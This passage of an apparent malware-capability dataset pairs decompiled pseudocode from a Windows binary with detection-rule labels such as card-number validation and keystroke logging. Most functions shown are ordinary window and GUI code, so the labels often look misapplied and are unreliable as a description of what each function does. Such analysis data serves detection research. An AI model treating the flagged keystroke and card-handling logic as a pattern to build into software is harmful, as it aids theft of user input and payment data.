        "decompiled_code": "\nvoid __fastcall fcn.004506bc(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    iVar1 = *param_2;\n    iVar2 = param_2[1];\n    (**(*in_EAX + 0x44))(iVar1, iVar2);\n    (**(*in_EAX + 0x88))((in_EAX[0x13] - iStack16) + iVar2, (in_EAX[0x12] - iStack20) + iVar1);\n    return;\n}\n",
        "token_count": 153
    },
    "00451810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar __fastcall fcn.00451810(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uchar *arg_8h;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uchar auStack28 [16];\n    \n    uVar3 = *param_2;\n    uVar4 = param_2[1];\n    uVar5 = param_2[2];\n    uVar6 = param_2[3];\n    if (*(in_EAX + 0x94) != 0) {\n        cVar1 = fcn.0040484c(uVar3, uVar4, uVar5, uVar6);\n        if (cVar1 == '\\0') {\n            cVar1 = '\\0';\n            goto code_r0x00451844;\n        }\n    }\n    cVar1 = '\\x01';\ncode_r0x00451844:\n    if (cVar1 != '\\0') {\n        iVar2 = fcn.00452c38();\n        if (iVar2 == 0) {\n            fcn.0040484c(uVar3, uVar4, uVar5, uVar6);\n        }\n        else {\n            uVar3 = fcn.004501f0();\n            arg_8h = auStack28;\n            fcn.004501ac();\n            fcn.00418464(arg_8h, uVar3);\n            fcn.0040484c();\n        }\n    }\n    return cVar1;\n}\n",
        "token_count": 351
    },
    "004519b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004519b4(uint param_1, int32_t param_2)\n\n{\n    uint uStack16;\n    \n    sub.user32.dll_GetCursorPos();\n    fcn.00450370();\n    *param_2 = param_2;\n    *(param_2 + 4) = uStack16;\n    return;\n}\n",
        "token_count": 76
    },
    "00451ae8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00451ae8(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EAX != 0) {\n        (**(in_EAX + 0x38))();\n    }\n    return 0;\n}\n",
        "token_count": 85
    },
    "00452190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452190(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = 0x451f30;\n    fcn.00451f3c(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar4);\n    uVar3 = 0x453484;\n    uVar4 = 0x45341c;\n    iVar1 = in_EAX;\n    iVar2 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00451f70(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, iVar1, uVar3, iVar2);\n    uVar3 = 0x453454;\n    uVar4 = 0x4533fc;\n    iVar1 = in_EAX;\n    iVar2 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00451f70(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, iVar1, uVar3, iVar2);\n    uVar3 = 0x45342c;\n    uVar4 = 0x453444;\n    iVar1 = in_EAX;\n    iVar2 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00451f70(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, iVar1, uVar3, iVar2);\n    uVar3 = 0x45346c;\n    uVar4 = 0x45340c;\n    iVar1 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00451f70(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, in_EAX, uVar3, iVar1);\n    return;\n}\n",
        "token_count": 520
    },
    "004523e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004523e4(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        if ((*(in_EAX + 0x48) < 0x8001) && (*(in_EAX + 0x4c) < 0x8001)) {\n            fcn.0043bb94(*(in_EDX + 10), *(in_EDX + 8));\n            fcn.0040484c();\n        }\n        else {\n            fcn.004519b4();\n            fcn.0043bb94(var_4h, var_8h);\n            fcn.0040484c();\n        }\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "00452c38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00452c38(uint param_1, uint *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = (**(*in_EAX + 0x58))(*param_2, param_2[1], param_2[2], param_2[3]);\n    if (iVar1 != 0) {\n        iVar1 = (**(*in_EAX + 0x58))();\n        iVar2 = fcn.00404528();\n        if (iVar1 != iVar2) {\n            iVar1 = (**(*in_EAX + 0x58))();\n            uVar3 = (**(iVar1 + 0x2c))();\n            fcn.0044fef4();\n            fcn.0044fec0();\n            fcn.004501c4();\n            fcn.00450208();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 225
    },
    "00453038": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00453038(uint param_1, int32_t param_2)\n\n{\n    double *in_EAX;\n    double *pdVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar2 = 0;\n    if (0 < param_2) {\n        iVar3 = 1;\n        pdVar1 = in_EAX;\n        do {\n            pdVar1 = pdVar1 + 1;\n            if (*pdVar1 < in_EAX[iVar2]) {\n                iVar2 = iVar3;\n            }\n            iVar3 = iVar3 + 1;\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return iVar2;\n}\n",
        "token_count": 173
    },
    "004534d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004534d0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    code **in_FS_OFFSET;\n    code *pcVar3;\n    code *pcStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        puStack40 = 0x4534e9;\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    uStack44 = 0x4535ea;\n    pcStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &fcn.004534d0::var_1h + 1;\n    var_1h._0_1_ = param_2;\n    fcn.0044f698();\n    pcVar3 = fcn.00455288;\n    uVar1 = fcn.00421030(fcn.00455288, in_EAX);\n    *(in_EAX + 0x1c0) = uVar1;\n    uVar1 = fcn.00424dbc();\n    *(in_EAX + 0x1a4) = uVar1;\n    fcn.00424f64();\n    *(in_EAX + 0x1dd) = 1;\n    *(in_EAX + 0x1d4) = 0xffffffff;\n    *(in_EAX + 0x1b8) = 3;\n    if (*(*0x495d2c + 4) == 0x11) {\n        fcn.00405530();\n    }\n    else {\n        fcn.00444194();\n        fcn.00405584();\n    }\n    *(in_EAX + 0x1db) = 0;\n    *(in_EAX + 0x192) = *0x453610;\n    *(in_EAX + 0x193) = 2;\n    *(in_EAX + 0x194) = 1;\n    *(in_EAX + 0x198) = 1;\n    *(in_EAX + 0x158) = 1;\n    iVar2 = fcn.0045dc48();\n    *(in_EAX + 0x1a0) = iVar2;\n    *(iVar2 + 0x1c) = in_EAX;\n    *(iVar2 + 0x18) = 0x459920;\n    *in_FS_OFFSET = pcVar3;\n    pcStack48 = 0x4535f1;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 636
    },
    "00453840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453840(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    \n    *param_2 = *param_2 + *(*(in_EAX + 0x1a0) + 8);\n    param_2[1] = param_2[1] + *(*(in_EAX + 0x1a0) + 0xc);\n    param_2[2] = param_2[2] - *(*(in_EAX + 0x1a0) + 0x10);\n    param_2[3] = param_2[3] - *(*(in_EAX + 0x1a0) + 0x14);\n    return;\n}\n",
        "token_count": 166
    },
    "00453c50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453c50(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar1 = fcn.004588a0();\n    if (cVar1 == '\\0') {\n        fcn.00418428();\n    }\n    else {\n        (**(*in_EAX + 0x44))();\n        *param_2 = var_8h;\n        param_2[1] = var_4h;\n    }\n    *param_2 = *param_2 - (*(in_EAX[0x68] + 8) + *(in_EAX[0x68] + 0x10));\n    param_2[1] = param_2[1] - (*(in_EAX[0x68] + 0xc) + *(in_EAX[0x68] + 0x14));\n    return;\n}\n",
        "token_count": 231
    },
    "00453de0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00453de0(int32_t arg_8h)\n\n{\n    uint *in_ECX;\n    uint in_EDX;\n    uint arg_8h_00;\n    uint arg_ch;\n    uint *arg_10h;\n    uint var_18h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *in_ECX;\n    uStack16 = in_ECX[1];\n    uStack12 = in_ECX[2];\n    uStack8 = in_ECX[3];\n    arg_10h = &var_10h;\n    arg_ch = *(arg_8h + -8);\n    arg_8h_00 = 0;\n    fcn.00453c50();\n    fcn.00453870(arg_8h_00, arg_ch, arg_10h, in_EDX);\n    return;\n}\n",
        "token_count": 207
    },
    "004541d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004541d0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00404620();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    fcn.004501ac();\n    iVar2 = fcn.00454684();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00454648();\n            if (*(iVar3 + 4) == *(in_EAX + 4)) {\n                fcn.00454648();\n                fcn.0041975c();\n                fcn.0044fec0();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar1 = *(iVar1 + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.004198b4();\n            fcn.00451ae8(arg_8h);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 326
    },
    "004544b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004544b4(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    fcn.0040484c();\n    uVar3 = 1;\n    piVar4 = param_2;\n    fcn.00451ae8(1);\n    uVar2 = 1;\n    fcn.00451ae8(1);\n    fcn.00454420(uVar2, uVar3, piVar4);\n    if ((*(param_2 + 7) & 2) == 0) {\n        fcn.00451ae8(0);\n        fcn.00451ae8(0);\n        fcn.00451ae8(0);\n        fcn.00451ae8(0);\n        cVar1 = fcn.004047dc();\n        if (cVar1 == '\\0') {\n            cVar1 = fcn.004588a0();\n            if (cVar1 != '\\0') {\n                (**(*param_2 + 0x80))();\n            }\n        }\n        else {\n            fcn.00451ae8(0);\n            fcn.00455154();\n        }\n        fcn.0045410c();\n    }\n    fcn.00451ae8(1);\n    return;\n}\n",
        "token_count": 306
    },
    "004545a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004545a8(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    \n    uVar2 = 0;\n    piVar3 = param_2;\n    fcn.00451ae8(0);\n    cVar1 = fcn.004047dc(uVar2, piVar3);\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.004588a0();\n        if (cVar1 != '\\0') {\n            fcn.00450c88();\n        }\n    }\n    else {\n        fcn.00454400();\n        (**(*param_2 + 0xb0))();\n    }\n    fcn.0045446c();\n    fcn.00451ae8(0);\n    fcn.00451ae8(0);\n    fcn.004541c8();\n    return;\n}\n",
        "token_count": 212
    },
    "00454684": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00454684(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (*(in_EAX + 0x1cc) != 0) {\n        iVar1 = *(*(in_EAX + 0x1cc) + 8);\n    }\n    if (*(in_EAX + 0x1d0) != 0) {\n        iVar1 = iVar1 + *(*(in_EAX + 0x1d0) + 8);\n    }\n    return iVar1;\n}\n",
        "token_count": 127
    },
    "00454714": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454714(uint param_1, ushort param_2)\n\n{\n    fcn.004546a4(param_2, 0, 0, 0);\n    return;\n}\n",
        "token_count": 46
    },
    "00454c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454c60(uint param_1, int32_t *param_2)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00452190();\n    uVar2 = 0x454ae0;\n    uVar1 = 0x454b18;\n    uVar3 = in_EAX;\n    fcn.00454b80(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar1, in_EAX, uVar2, uVar3);\n    return;\n}\n",
        "token_count": 149
    },
    "00454fa4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00454fa4(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x454fba;\n    fcn.0040484c();\n    puStack20 = 0x454fc7;\n    fcn.00459934();\n    uStack24 = 0x455000;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    (**(*in_EAX + 0xb0))();\n    fcn.00455154();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x455007;\n    uStack24 = 0x454fff;\n    fcn.00459934();\n    return;\n}\n",
        "token_count": 206
    },
    "00455490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "log keystrokes via polling"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00455490(int32_t param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t in_stack_fffffec4;\n    int16_t iStack300;\n    int16_t iStack298;\n    int32_t iStack296;\n    int32_t iStack292;\n    uchar auStack44 [4];\n    int32_t iStack40;\n    int32_t iStack36;\n    uint32_t uStack32;\n    uchar uStack28;\n    uint uStack24;\n    \n    sub.user32.dll_GetMessagePos();\n    uVar2 = fcn.0040773c();\n    iStack300 = uVar2;\n    iStack296 = iStack300;\n    iStack298 = uVar2 >> 0x10;\n    iStack292 = iStack298;\n    iStack36 = 0x4554cc;\n    fcn.00450370();\n    if (param_1 == 0) {\n        iStack36 = 0;\n        in_stack_fffffec4 = 0;\n        param_1 = fcn.004553cc(0, 0);\n    }\n    if (param_1 == 0) {\n        return 0;\n    }\n    iStack40 = in_stack_fffffec4;\n    if (in_EAX != param_1) {\n        iStack40 = in_stack_fffffec4 - *(param_1 + 0x40);\n        iStack36 = iStack36 - *(param_1 + 0x44);\n    }\n    uStack32 = *(param_2 + 8);\n    uStack24 = *(param_2 + 4);\n    uVar3 = *(param_2 + 10);\n    if (uVar3 < 0x201) {\n        if (uVar3 - 0xa1 < 2) {\ncode_r0x00455571:\n            uStack28 = 0;\n            goto code_r0x00455597;\n        }\n        if (uVar3 - 0xa4 < 2) {\ncode_r0x00455585:\n            uStack28 = 1;\n            goto code_r0x00455597;\n        }\n        uVar3 = uVar3 - 0xa7;\n    }\n    else {\n        if (uVar3 - 0x201 < 2) goto code_r0x00455571;\n        if (uVar3 - 0x204 < 2) goto code_r0x00455585;\n        uVar3 = uVar3 - 0x207;\n    }\n    if (uVar3 < 2) {\n        uStack28 = 2;\n    }\n    else {\n        uStack28 = 0;\n    }\ncode_r0x00455597:\n    sub.user32.dll_GetKeyboardState(&stack0xfffffed8);\n    uVar1 = fcn.0043bc2c();\n    uStack32._0_2_ = CONCAT11(uVar1, uStack32);\n    uStack32 = uStack32 & 0xffff0000 | uStack32;\n    uVar2 = fcn.00451ae8(&stack0xffffffd4);\n    *(param_2 + 0xc) = uVar2;\n    return 1;\n}\n",
        "token_count": 741
    },
    "00455cb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00455cb8(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.0044d290();\n    if (iVar1 != 0) {\n        uVar2 = fcn.00451ae8(*(param_2 + 8));\n        *(param_2 + 0xc) = uVar2;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 106
    },
    "00456164": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456164(uint param_1, int32_t *param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    int32_t *arg_ch;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_18h;\n    uint nSavedDC;\n    int32_t *nLeftRect;\n    uint hdc;\n    \n    puStack36 = 0x456179;\n    nLeftRect = param_2;\n    hdc = in_EAX;\n    nSavedDC = sub.gdi32.dll_SaveDC();\n    uStack40 = 0x4561fa;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    sub.gdi32.dll_ExcludeClipRect(hdc, *nLeftRect + 2, nLeftRect[1] + 2, nLeftRect[2] + -2, nLeftRect[3] + -2);\n    fcn.004321c4();\n    fcn.00432434();\n    arg_8h = 0;\n    arg_ch = nLeftRect;\n    fcn.004321c4();\n    fcn.00432388(arg_8h, arg_ch);\n    *in_FS_OFFSET = arg_8h;\n    sub.gdi32.dll_RestoreDC(hdc, nSavedDC, 0x456201);\n    return;\n}\n",
        "token_count": 329
    },
    "00456e84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456e84(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040484c();\n    fcn.0040484c(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 77
    },
    "00457f70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00457f70(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_3ch;\n    uint var_2ch;\n    uint var_10h;\n    \n    if ((((in_EDX == in_EAX[0x10]) && (in_ECX == in_EAX[0x11])) && (arg_ch == in_EAX[0x12])) && (arg_8h == in_EAX[0x13])\n       ) {\n        return;\n    }\n    cVar1 = fcn.004588a0();\n    if ((cVar1 == '\\0') || (iVar2 = sub.user32.dll_IsIconic(in_EAX[0x6d]),  iVar2 != 0)) {\n        in_EAX[0x10] = in_EDX;\n        in_EAX[0x11] = in_ECX;\n        in_EAX[0x12] = arg_ch;\n        in_EAX[0x13] = arg_8h;\n        cVar1 = fcn.004588a0();\n        if (cVar1 != '\\0') {\n            var_2ch = 0x2c;\n            sub.user32.dll_GetWindowPlacement(in_EAX[0x6d], &var_2ch);\n            fcn.00450150();\n            sub.user32.dll_SetWindowPlacement();\n        }\n    }\n    else {\n        sub.user32.dll_SetWindowPos(in_EAX[0x6d], 0);\n    }\n    fcn.0044fd3c();\n    fcn.004533c8();\n    (**(*in_EAX + 0x5c))();\n    return;\n}\n",
        "token_count": 401
    },
    "0045804c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045804c(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00454684(param_2, param_1);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00454648();\n            fcn.0040484c();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00458498": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00458498(void)\n\n{\n    int32_t in_EAX;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar auStack20 [16];\n    \n    puStack32 = &stack0xffffffec;\n    uStack24 = 0x4584a7;\n    fcn.00450150();\n    uStack24 = 1;\n    uStack28 = 1;\n    sub.user32.dll_InflateRect();\n    sub.user32.dll_InvalidateRect(*(*(in_EAX + 0x30) + 0x1b4), &stack0xffffffe0, 0xffffffff);\n    return;\n}\n",
        "token_count": 146
    },
    "004588ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004588ac(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iStack116;\n    uchar *puStack112;\n    int32_t iStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack60;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    uStack76 = *(in_EAX + 0x1b4);\n    puStack80 = 0x4588c0;\n    iVar1 = sub.user32.dll_IsIconic();\n    if (iVar1 == 0) {\n        uStack84 = *(in_EAX + 0x1b4);\n        uStack88 = 0x4588f6;\n        puStack80 = &stack0xffffffb4;\n        sub.user32.dll_GetWindowRect();\n    }\n    else {\n        uStack60 = 0x2c;\n        puStack80 = &stack0xffffffc4;\n        uStack84 = *(in_EAX + 0x1b4);\n        uStack88 = 0x4588dd;\n        sub.user32.dll_GetWindowPlacement();\n        uStack84 = uStack40;\n        puStack80 = puStack36;\n        uStack76 = uStack32;\n        uStack72 = uStack28;\n    }\n    uStack88 = 0xfffffff0;\n    uStack92 = *(in_EAX + 0x1b4);\n    uStack96 = 0x458904;\n    uVar2 = sub.user32.dll_GetWindowLongA();\n    if ((uVar2 & 0x40000000) != 0) {\n        uStack96 = 0xfffffff8;\n        uStack100 = *(in_EAX + 0x1b4);\n        puStack104 = 0x458919;\n        iVar1 = sub.user32.dll_GetWindowLongA();\n        if (iVar1 != 0) {\n            sub.user32.dll_ScreenToClient();\n            sub.user32.dll_ScreenToClient();\n            iStack116 = iVar1;\n            puStack112 = &stack0xffffff9c;\n            iStack108 = iVar1;\n            puStack104 = &stack0xffffff9c;\n        }\n    }\n    *(in_EAX + 0x40) = iStack116;\n    *(in_EAX + 0x44) = puStack112;\n    *(in_EAX + 0x48) = iStack108 - iStack116;\n    *(in_EAX + 0x4c) = puStack104 - puStack112;\n    fcn.0044fd3c();\n    return;\n}\n",
        "token_count": 637
    },
    "00458afc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00458afc(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00454684();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.00454648();\n            if (*(iVar2 + 4) == in_EDX) {\n                (*arg_8h)();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "00459b50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00459b50(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    uStack16 = 0x459b61;\n    var_4h = in_EAX;\n    uStack16 = fcn.00458594();\n    puStack20 = 0x459b67;\n    var_8h = sub.user32.dll_GetWindowDC();\n    uStack24 = 0x459ba6;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    (**(*var_4h + 0xdc))();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x459bad;\n    uStack24 = var_8h;\n    uStack28 = 0x459b9f;\n    uStack28 = fcn.00458594();\n    sub.user32.dll_ReleaseDC();\n    return;\n}\n",
        "token_count": 258
    },
    "00459bb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00459bb4(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x459c4d;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    (**(*in_EAX + 0x44))();\n    var_10h = var_10h + 2;\n    var_ch = var_ch + 2;\n    fcn.004246a8();\n    uVar1 = fcn.00453178();\n    fcn.00450830(0xffffffff, &var_10h, uVar1 | 0x810);\n    uVar2 = fcn.004059dc();\n    uVar2 = fcn.004256c0(uVar2);\n    sub.user32.dll_DrawTextA();\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x459c54);\n    return;\n}\n",
        "token_count": 279
    },
    "00459f58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00459f58(void)\n\n{\n    int32_t *in_EAX;\n    uint var_10h;\n    \n    (**(*in_EAX + 0xe0))();\n    return;\n}\n",
        "token_count": 46
    },
    "00459f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
